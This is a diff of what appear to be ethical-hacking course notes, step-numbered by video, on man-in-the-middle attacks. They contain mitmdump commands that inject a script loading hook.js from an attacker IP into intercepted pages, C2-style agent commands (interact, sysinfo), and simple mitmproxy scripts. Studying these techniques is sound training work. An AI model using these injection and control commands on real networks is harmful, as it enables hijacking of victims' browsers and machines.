@@ -303,8 +303,49 @@ v-60)
 
 18) iptables -t nat --flush
 
-v-60)
+v-62)
 
-19) ./mitmdump --transparent --replace 
+19) ./mitmdump --transparent --replace :~bs:"</body>":"<script src="http://10.20.215.8:3000/hook.js"></script></body>"
 
-20) 
+20) ./mitmdump --transparent --replace :~s:"</body>":"<script src="http://10.20.215.8:3000/hook.js"></script></body>"
+
+v-64)
+
+21) agents 
+
+22) interact 5UG8HVK1
+
+23) sysinfo
+
+section - 11)
+
+v-66)
+
+import mitmproxy
+
+1)
+
+def request(flow):
+    #code to handle request flows
+    print("[+] This is a request flow")
+    print(flow)
+def response(flow):
+    #code to handle response flows
+    print("[+] This is a repsonse flow")
+    print(flow)
+
+
+2) ./mitmdump -s /root/basic.py 
+
+v-67
+
+3)
+
+import mitmproxy
+
+def request(flow):
+    print("[+] This is a request flow")
+    print(flow.request)
+
+
+4) 
